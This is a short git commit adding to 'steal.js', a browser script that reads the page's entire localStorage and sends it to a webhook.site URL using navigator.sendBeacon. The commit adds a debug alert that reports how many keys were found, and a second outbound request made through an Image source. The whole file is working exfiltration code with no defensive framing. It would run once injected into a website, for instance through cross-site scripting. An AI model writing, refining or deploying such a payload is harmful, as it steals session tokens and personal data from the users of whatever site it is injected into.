ce36fa3eee4f23c619f52d0391e16c8fd5fc7c92
Lilian <dornelilian@gmail.com>
2026-03-29 12:19:13 +0200

    Add debug alert + dual exfil methods

--- steal.js
+++ steal.js
@@ -1,4 +1,6 @@
-// Exfiltrate localStorage to webhook via POST (no size limit)
+// Exfiltrate localStorage to webhook
+alert('steal.js loaded - keys: ' + Object.keys(localStorage).length);
 var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
 var d = JSON.stringify(localStorage);
 navigator.sendBeacon(w, d);
+new Image().src = w + '?ping=ok&ts=' + Date.now();
